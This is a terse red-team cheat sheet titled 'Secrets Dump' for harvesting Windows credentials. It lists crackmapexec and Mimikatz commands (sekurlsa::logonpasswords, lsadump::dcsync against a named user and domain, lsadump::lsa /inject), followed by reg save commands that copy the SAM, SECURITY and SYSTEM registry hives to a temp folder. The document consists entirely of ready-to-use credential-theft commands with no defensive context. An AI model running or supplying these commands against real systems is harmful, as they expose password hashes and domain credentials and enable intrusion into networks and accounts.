# Secrets Dump
crackmapexec

Check with `Privilege::debug` if the right priv are set (admin).

Sekurlsa::logonpasswords
Lsadump::dcsync /user:\<USER\> /domain:\<DOMAIN\>
Lsadump::lsa /inject /name:\<USER\>

```
reg save hklm\sam c:\temp\sam.save
reg save hklm\security c:\temp\security.save
reg save hklm\system c:\temp\system.save
```